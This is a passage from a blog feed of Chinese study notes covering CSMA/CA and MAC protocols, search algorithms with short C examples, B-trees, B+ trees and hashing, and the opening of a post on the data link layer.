title="7.CSMA/CA协议"></a>7.CSMA/CA协议</h4><p>&emsp;&emsp;CSMA/CA协议的产生是因为CSMA/CD只能用于总线式以太网（有线介质），为了解决无线局域网的问题，CSMA/CD无法做到360°全满检测，也无法应对隐蔽站（当A和C都检测不到信号，认为信道空闲时，同时向终端B发送数 据帧，就会导致冲突）的问题</p><ul><li><h6 id="CSMA-CA协议工作原理"><a href="#CSMA-CA协议工作原理" class="headerlink" title="CSMA/CA协议工作原理"></a>CSMA/CA协议工作原理</h6></li></ul><p>&emsp;&emsp;1、在发送数据前，先检测信道是否空闲。</p><p>&emsp;&emsp;2、空闲则发出RTS（request to send），RTS包括发射端的地址、接收端的地址、下一份数据将持续发送的时间 等信息；信道忙则等待</p><p>&emsp;&emsp;3、接收端收到RTS后，将响应CTS（clear to send）</p><p>&emsp;&emsp;4、发送端收到CTS后，开始发送数据帧（同时预约信道：发送方告知其他站点自己要传多久数据）</p><p>&emsp;&emsp;5、接收端收到数据帧后，将用CRC来检验数据是否正确，正确则响应ACK帧。</p><p>&emsp;&emsp;6、发送方收到ACK就可以进行下一个数据帧的发送，若没有则一直重传至规定重发次数为止（采用二进制指数 退避算法来确定随机的推迟时间）</p><h4 id="8-CSMA-CA与CSMA-CD的比较"><a href="#8-CSMA-CA与CSMA-CD的比较" class="headerlink" title="8.CSMA/CA与CSMA/CD的比较"></a>8.CSMA/CA与CSMA/CD的比较</h4><ul><li><h6 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h6></li></ul><p>&emsp;&emsp;CSMA/CD与CSMA/CA机制都从属于CSMA的思路，其核心是先听再说。换言之，两个在接入信道之前都须要 进行监听。当发现信道空闲后，才能进行接入。</p><ul><li><h6 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h6></li></ul><p>&emsp;&emsp;1、传输介质不同：CSMA/CD 用于总线式以太网【有线】，而CSMA/CA用于无线局域网【无线】</p><p>&emsp;&emsp;2、.载波检测方式不同：因传输介质不同，CSMA/CD与CSMA/CA的检测方式也不同。CSMA/CD通过电缆中电压 的变化来检测，当数据发生碰撞时，电缆中的电压就会随着发生变化；而CSMA/CA采用能量检测（ED）、 载波检测（CS）和能量载波混合检测三种检测信道空闲的方式</p><p>&emsp;&emsp;3、CSMA/CD检测冲突，CSMA/CA避免冲突，二者出现冲突后都会进行有上限的重传</p><p>&emsp;</p><h4 id="9-轮询访问介质访问控制"><a href="#9-轮询访问介质访问控制" class="headerlink" title="9.轮询访问介质访问控制"></a>9.轮询访问介质访问控制</h4><ul><li><h6 id="轮询协议"><a href="#轮询协议" class="headerlink" title="轮询协议"></a>轮询协议</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/16.png" style="zoom:80%;" /></center><ul><li><h6 id="令牌传递协议"><a href="#令牌传递协议" class="headerlink" title="令牌传递协议"></a>令牌传递协议</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/17.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="10-介质访问控制总结"><a href="#10-介质访问控制总结" class="headerlink" title="10.介质访问控制总结"></a>10.介质访问控制总结</h4><ul><li><h6 id="信道划分介质访问控制MAC协议"><a href="#信道划分介质访问控制MAC协议" class="headerlink" title="信道划分介质访问控制MAC协议"></a>信道划分介质访问控制MAC协议</h6></li></ul><p>&emsp;&emsp;基于多路复用技术划分资源</p><p>&emsp;&emsp;网络负载重时：共享信道效率高，且公平</p><p>&emsp;&emsp;网络负载轻时：共享信道效率低</p><ul><li><h6 id="随机访问MAC协议"><a href="#随机访问MAC协议" class="headerlink" title="随机访问MAC协议"></a>随机访问MAC协议</h6></li></ul><p>&emsp;&emsp;用户根据意愿随机发送信息，发送信息时可独占信道带宽</p><p>&emsp;&emsp;网络负载重时：产生冲突开销</p><p>&emsp;&emsp;网络负载轻时：共享信道效率高，单个结点可利用信道全部带宽</p><ul><li><h6 id="轮询访问MAC协议-轮流协议-轮转访问MAC协议："><a href="#轮询访问MAC协议-轮流协议-轮转访问MAC协议：" class="headerlink" title="轮询访问MAC协议/轮流协议/轮转访问MAC协议："></a>轮询访问MAC协议/轮流协议/轮转访问MAC协议：</h6></li></ul><p>&emsp;&emsp;既要不产生冲突，又要发送时占全部带宽。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/18.png" style="zoom:80%;" /></center>]]></content>
    
    
    <categories>
      
      <category>计算机网络学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>查找</title>
    <link href="/2022/11/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/"/>
    <url>/2022/11/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/</url>
    
    <content type="html"><![CDATA[<h1 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h1><h4 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a>1.基本概念</h4><p>&emsp;&emsp;查找：在数据集合中寻找到满足某种条件的数据元素的过程称之为查找</p><p>&emsp;&emsp;查找表（查找结构）：用于查找的数据集合合称为查找表，它是由同一类型的数据元素（或记录）组成</p><p>&emsp;&emsp;关键字：数据元素汇总唯一识别该元素的某个数据项的值，使用基于关键字的查找，查找结果应该是唯一的</p><p>&emsp;&emsp;查找长度：在查找运算中，需要对比关键字的次数称为查找长度</p><p>&emsp;&emsp;平均查找长度（ASL）：所有查找过程中进行关键字的比较次数的平均值</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/1.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-顺序查找"><a href="#2-顺序查找" class="headerlink" title="2.顺序查找"></a>2.顺序查找</h4><ul><li><h6 id="算法思想"><a href="#算法思想" class="headerlink" title="算法思想"></a>算法思想</h6></li></ul><p>&emsp;&emsp;顺序查找有称为“线性查找”，通常用于线性表中，算法的中心思想就是从到到位挨个进行查找</p><ul><li><h6 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>   //查找表的数据结构</span><br><span class="hljs-class">&#123;</span><br>    ElemType *elem;    <span class="hljs-comment">//动态数组基址</span><br>    <span class="hljs-type">int</span> TableLen;     <span class="hljs-comment">//表的长度</span><br>&#125;SSTable;<br><br><span class="hljs-comment">//方法一：从前往后</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Search_Seq</span><span class="hljs-params">(SSTable ST,ElemType key)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;ST.TableLen &amp;&amp; ST.elem[i]！=key; ++i);<br>    <span class="hljs-comment">//查找成功，则返回元素下标，查找失败则返回-1</span><br>    <span class="hljs-keyword">return</span> i==ST.TableLen?<span class="hljs-number">-1</span>:i;<br>        <br>&#125;<br><br><span class="hljs-comment">//方法二：从后往前</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Search_Seq</span><span class="hljs-params">(SSTable ST,ElemType key)</span><br>&#123;<br>    ST.elem[<span class="hljs-number">0</span>]=key;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>ST.TableLen;ST.elem[i]！=key; --i);<br>    <span class="hljs-comment">//查找成功，则返回元素下标，查找失败则返回-1</span><br>    <span class="hljs-keyword">return</span> i;<br>        <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="查找效率"><a href="#查找效率" class="headerlink" title="查找效率"></a>查找效率</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/2.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;&emsp;有序的排列有利于提高查找的效率</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/3.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="3-折半查找"><a href="#3-折半查找" class="headerlink" title="3.折半查找"></a>3.折半查找</h4><ul><li><h6 id="实现思想"><a href="#实现思想" class="headerlink" title="实现思想"></a>实现思想</h6></li></ul><p>&emsp;&emsp;折半查找有称为“二分查找”，仅适用于有序的顺序表</p><ul><li><h6 id="实现代码-1"><a href="#实现代码-1" class="headerlink" title="实现代码"></a>实现代码</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>   //查找表的数据结构</span><br><span class="hljs-class">&#123;</span><br>    ElemType *elem;    <span class="hljs-comment">//动态数组基址</span><br>    <span class="hljs-type">int</span> TableLen;     <span class="hljs-comment">//表的长度</span><br>&#125;SSTable;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Binary_Search</span><span class="hljs-params">(SSTable ST,ElemType key)</span><br>&#123;<br>    <span class="hljs-type">int</span> low=<span class="hljs-number">1</span>,high=L.TableLen<span class="hljs-number">-1</span>,mid;<br>    <span class="hljs-keyword">while</span>(low&lt;=high)<br>    &#123;<br>        mid=(low+high)/<span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span>(L.elem[mid]==key)<br>            <span class="hljs-keyword">return</span> mid;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(L.elem[mid]&gt;key)<br>             high=mid<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">else</span><br>            low=mid+<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;      <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="查找效率-1"><a href="#查找效率-1" class="headerlink" title="查找效率"></a>查找效率</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;注：如果当前low和high之间有偶数个元素，则 mid 分隔后，左半部分⽐右半部分少⼀个元素，并且折半查找的判定树一定是平衡二叉树，只有最下面一层是不满的</p><p>&emsp;</p><h4 id="4-分块查找"><a href="#4-分块查找" class="headerlink" title="4.分块查找"></a>4.分块查找</h4><ul><li><h6 id="实现思想-1"><a href="#实现思想-1" class="headerlink" title="实现思想"></a>实现思想</h6></li></ul><p>&emsp;&emsp;分块查找有称索引顺序查找，实现通过索引表中确定待查记录所属的分块（可顺序、可折半），然后在快内顺序查找</p><p>&emsp;&emsp;“索引表”中保存每个分 块的最⼤关键字和分块 的存储区间</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/5.jpg" style="zoom:80%;" /></center><ul><li><h6 id="实现代码-2"><a href="#实现代码-2" class="headerlink" title="实现代码"></a>实现代码</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//索引表</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    ElemType maxValue;<br>    <span class="hljs-type">int</span> low,high;<br>&#125;Index;<br><br><span class="hljs-comment">//顺序表存储实际元素</span><br>ElemType List[<span class="hljs-number">100</span>];<br></code></pre></td></tr></table></figure><ul><li><h6 id="查找效率-2"><a href="#查找效率-2" class="headerlink" title="查找效率"></a>查找效率</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/6.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/7.png" style="zoom:85%;" /></center><p>&emsp;&emsp;注：常考的效率为顺序查找索引表</p><p>&emsp;</p><h4 id="5-B树"><a href="#5-B树" class="headerlink" title="5.B树"></a>5.B树</h4><p>&emsp;&emsp;一般来说比较注重的是B树的性质、插入、删除、查找等相关内容</p><ul><li><h6 id="举例——五叉排序树"><a href="#举例——五叉排序树" class="headerlink" title="举例——五叉排序树"></a>举例——五叉排序树</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>   </span><br><span class="hljs-class">&#123;</span><br>    ElwmType key[<span class="hljs-number">4</span>];       <span class="hljs-comment">//最多四个关键字</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">child</span>[5];</span>   <span class="hljs-comment">//最多五个孩子</span><br>    <span class="hljs-type">int</span> num;    <span class="hljs-comment">// 结点中有几个关键字</span><br>&#125;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/8.png" style="zoom:85%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/9.png" style="zoom:85%;" /></center><ul><li><h6 id="B树的定义"><a href="#B树的定义" class="headerlink" title="B树的定义"></a>B树的定义</h6></li></ul><p>&emsp;&emsp;B树，⼜称多路平衡查找树，B树中所有结点的孩⼦个数的最⼤值称为B树的阶，通常⽤m表示。⼀棵m阶B树 或为空树，或为满⾜如下特性的m叉树：</p><p>&emsp;&emsp;1）树中每个结点⾄多有m棵⼦树，即⾄多含有m-1个关键字</p><p>&emsp;&emsp;2）若根结点不是终端结点，则⾄少有两棵⼦树</p><p>&emsp;&emsp;3）除根结点外的所有⾮叶结点⾄少有⌈m/2⌉棵⼦树，即⾄少含有 ⌈m/2⌉-1个关键字</p><p>&emsp;&emsp;4）所有的叶结点都出现在同⼀层次上，并且不带信息（可以视为外部结点或类似于折半查找判定树的查找失 败结点，实际上这些结点不存在，指向这些结点的指针为空）</p><p>&emsp;&emsp;5)所有⾮叶结点的结构如下：</p><table><thead><tr><th align="center">n</th><th>p 0</th><th>k1</th><th>p1</th><th>k2</th><th>p2</th><th>…</th><th>kn</th><th>pn</th></tr></thead></table><p>&emsp;&emsp;其中，Ki（i = 1, 2,…, n）为结点的关键字，且满⾜K1 &lt; K2 &lt;…&lt; Kn；Pi（i = 0, 1,…, n）为指向⼦树根结点 的指针，且指针Pi-1所指⼦树中所有结点的关键字均⼩于Ki，Pi所指⼦树中所有结点的关键字均⼤于Ki，n（⌈m/2⌉- 1≤n≤m - 1）为结点中关键字的个数。</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/10.png" style="zoom:100%;" /></center><ul><li><h6 id="m阶B树的核⼼特性"><a href="#m阶B树的核⼼特性" class="headerlink" title="m阶B树的核⼼特性"></a>m阶B树的核⼼特性</h6></li></ul><p>&emsp;&emsp;1） 根节点的⼦树数∈[2, m]，关键字数∈[1, m-1]。 其他结点的⼦树数∈[⌈m/2⌉ , m]；关键字数∈[ ⌈m/2⌉-1, m-1] </p><p>&emsp;&emsp;2）对任⼀结点，其所有⼦树⾼度都相同 </p><p>&emsp;&emsp;3）关键字的值：⼦树0&lt;关键字1&lt;⼦树1&lt;关键字2&lt;⼦树2&lt;…. (类⽐⼆叉查找树 左&lt;中&lt;右)</p><ul><li><h6 id="B数的最小高度"><a href="#B数的最小高度" class="headerlink" title="B数的最小高度"></a>B数的最小高度</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/11.png" style="zoom:100%;" /></center><ul><li><h6 id="B数的最大高度"><a href="#B数的最大高度" class="headerlink" title="B数的最大高度"></a>B数的最大高度</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/12.png" style="zoom:100%;" /></center>&emsp;<h4 id="6-B树的插入和删除"><a href="#6-B树的插入和删除" class="headerlink" title="6.B树的插入和删除"></a>6.B树的插入和删除</h4><ul><li><h6 id="举例——五阶B树的插入"><a href="#举例——五阶B树的插入" class="headerlink" title="举例——五阶B树的插入"></a>举例——五阶B树的插入</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/13.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/14.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/15.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/16.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/17.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/18.png" style="zoom:100%;" /></center><ul><li><h6 id="举例——五阶B树的删除"><a href="#举例——五阶B树的删除" class="headerlink" title="举例——五阶B树的删除"></a>举例——五阶B树的删除</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/19.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/20.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/21.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/22.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/23.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/24.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/25.png" style="zoom:100%;" /></center><p>&emsp;</p><h4 id="7-B-树"><a href="#7-B-树" class="headerlink" title="7.B+树"></a>7.B+树</h4><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/27.png" style="zoom:100%;" /></center><p>&emsp;&emsp;一般只要求掌握概念⼀棵m阶的B+树需满⾜下列条件： </p><p>&emsp;&emsp;1）每个分⽀结点最多有m棵⼦树（孩⼦结点） </p><p>&emsp;&emsp;2）⾮叶根结点⾄少有两棵⼦树，其他每个分⽀结点⾄少有⌈m/2⌉棵⼦树。</p><p>&emsp;&emsp; 3）结点的⼦树个数与关键字个数相等。</p><p>&emsp;&emsp;4）所有叶结点包含全部关键字及指向相应记录的指针，叶结点中将关键字按⼤⼩顺序排列，并且相邻叶结点按⼤⼩顺序相互链接起来。 </p><p>&emsp;&emsp;5）所有分⽀结点中仅包含它的各个⼦结点中关键字的最⼤值及指向其⼦结点的指针。</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/26.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/28.png" style="zoom:100%;" /></center><p>&emsp;</p><h4 id="8-散列查找"><a href="#8-散列查找" class="headerlink" title="8.散列查找"></a>8.散列查找</h4><p>&emsp;&emsp;散列表，又称哈希表，是一种数据结构，特点是：数据元素的关键字与其存储地址直接相关</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/29.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/30.png" style="zoom:100%;" /></center><ul><li><h6 id="查找效率-3"><a href="#查找效率-3" class="headerlink" title="查找效率"></a>查找效率</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/31.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/32.png" style="zoom:100%;" /></center><ul><li><h6 id="常见的散列函数"><a href="#常见的散列函数" class="headerlink" title="常见的散列函数"></a>常见的散列函数</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/33.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/34.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/35.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/36.png" style="zoom:100%;" /></center><p>&emsp;</p><h4 id="9-散列查找处理冲突方法——拉链法"><a href="#9-散列查找处理冲突方法——拉链法" class="headerlink" title="9.散列查找处理冲突方法——拉链法"></a>9.散列查找处理冲突方法——拉链法</h4><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/37.png" style="zoom:100%;" /></center><p>&emsp;</p><h4 id="10-散列查找处理冲突方法——开放定址法"><a href="#10-散列查找处理冲突方法——开放定址法" class="headerlink" title="10.散列查找处理冲突方法——开放定址法"></a>10.散列查找处理冲突方法——开放定址法</h4><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/38.png" style="zoom:100%;" /></center><ul><li><h6 id="线性探测法"><a href="#线性探测法" class="headerlink" title="线性探测法"></a>线性探测法</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/39.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/40.png" style="zoom:100%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/41.png" style="zoom:100%;" /></center><ul><li><h6 id="平方探测法"><a href="#平方探测法" class="headerlink" title="平方探测法"></a>平方探测法</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/42.png" style="zoom:100%;" /></center><p>&emsp;&emsp;⾮重点⼩坑：散列表⻓度m必须是⼀个可以表示成4j + 3的素数，才能探测到所有位置</p><ul><li><h6 id="伪随机序列法"><a href="#伪随机序列法" class="headerlink" title="伪随机序列法"></a>伪随机序列法</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/43.png" style="zoom:100%;" /></center><p>&emsp;</p><h4 id="11-散列查找处理冲突方法——再散列法"><a href="#11-散列查找处理冲突方法——再散列法" class="headerlink" title="11.散列查找处理冲突方法——再散列法"></a>11.散列查找处理冲突方法——再散列法</h4><p>&emsp;&emsp;一般而言不经常考，理解即可</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%9D/44.png" style="zoom:100%;" /></center>]]></content>
    
    
    <categories>
      
      <category>数据结构学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据链路层（上）</title>
    <link href="/2022/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/"/>
    <url>/2022/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="数据链路层（上）"><a href="#数据链路层（上）" class="headerlink" title="数据链路层（上）"></a>数据链路层（上）</h1><h4 id="1-链路层导图"><a href="#1-链路层导图" class="headerlink" title="1.链路层导图"></a>1.链路层导图</h4><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/1.png" style="zoom:100%;" /></center><p> &emsp;&emsp;数据链路层负责通过一条链路从一个结点向另一个物理链路直接相连的相邻结点传送数据报</p><p>&emsp;</p><h4 id="2-数据链路层概述"><a href="#2-数据链路层概述" class="headerlink" title="2.数据链路层概述"></a>2.数据链路层概述</h4><ul><li><h5 id="基本术语"><a href="#基本术语" class="headerlink" title="基本术语"></a>基本术语</h5></li></ul><p>&emsp;&emsp;结点：主机、路由器</p><p>&emsp;&emsp;链路：网络汇总两个结点之间的物理通道，链路的传输介质主要有双绞线、光纤和微波。分为有有线链路、无线链路</p><p>&emsp;&emsp;数据链路：网络中两个结点之间的逻辑通道，吧实现控制数据传输协议的硬件和软件加到链路上就构成数据链路</p><p>&emsp;&emsp;帧：链路层的协议数据单元，封装网络层数据报</p><ul><li><h6 id="功能概述"><a href="#功能概述" class="headerlink" title="功能概述"></a>功能概述</h6></li></ul><p>&emsp;&emsp;数据链路层在物理层提供服务的基础上，下个网络层提供服务，其最基本的服务是将源自网络层来的数据可靠地传输到相邻结点的目标机网络层。其主要作用是加强物理层传输原始比特流的功能，将物理层提供的可能出错的物理连接改造成为逻辑上无差错的数据链路，使之对网络层表现为一条无差错的链路。</p><p>&emsp;&emsp;功能一：为网络层提供服务，无确认无连接服务，有确认无连接服务，有确认面向连接服务。（有连接就一定有确认！）</p><p>&emsp;&emsp;功能二：链路管理，即连接的建立、维持、释放（用于面向连接的服务）</p><p>&emsp;&emsp;功能三：组帧</p><p>&emsp;&emsp;功能四：流量控制，限制发送方</p><p>&emsp;&emsp;功能五：差错控制（帧错/位错）</p><p>&emsp;</p><h4 id="3-帧的相关概念"><a href="#3-帧的相关概念" class="headerlink" title="3.帧的相关概念"></a>3.帧的相关概念</h4><ul><li><h5 id="封装成帧"><a href="#封装成帧" class="headerlink" title="封装成帧"></a>封装成帧</h5></li></ul><p>是在一段数据的前后部分添加首部和尾部，这样就构成了一个帧，接收端在收到物理层上交的比特流后，就能根据首部和尾部的标记，从收到的比特流中识别帧的开始和结束。其中，首部和尾部包含了许多的控制信息，他们有一个重要的作用：帧定界（确定帧的界限）</p><ul><li><h5 id="帧同步"><a href="#帧同步" class="headerlink" title="帧同步"></a>帧同步</h5></li></ul><p>&emsp;&emsp;接收方应当从接收的二进制比特流中区分出帧的起始和终止</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/2.png" style="zoom:80%;" /></center><ul><li><h5 id="透明传输"><a href="#透明传输" class="headerlink" title="透明传输"></a>透明传输</h5></li></ul><p>&emsp;&emsp;透明传输：是指不管所传输数据是什么样的比特组合，都应当能够在链路上传送，因此，链路层就“看不见”有什么妨碍数据传输的东西，而当所传数据中的比特组合恰巧与某一控制信息完全一样时，就必须采取适当的措施，使收方不会将这样的数据误认为是某种控制信息，这样子才能保证数据链路层的传输是透明的</p><ul><li><h5 id="组帧的四种方法："><a href="#组帧的四种方法：" class="headerlink" title="组帧的四种方法："></a>组帧的四种方法：</h5></li></ul><h6 id="1-字符计数法"><a href="#1-字符计数法" class="headerlink" title="1.字符计数法"></a>1.字符计数法</h6><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/3.png" style="zoom:80%;" /></center><h6 id="2-字符（节）填充法"><a href="#2-字符（节）填充法" class="headerlink" title="2.字符（节）填充法"></a>2.字符（节）填充法</h6><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/4.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/5.png" style="zoom:80%;" /></center><h6 id="3-零比特填充法"><a href="#3-零比特填充法" class="headerlink" title="3.零比特填充法"></a>3.零比特填充法</h6><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/6.png" 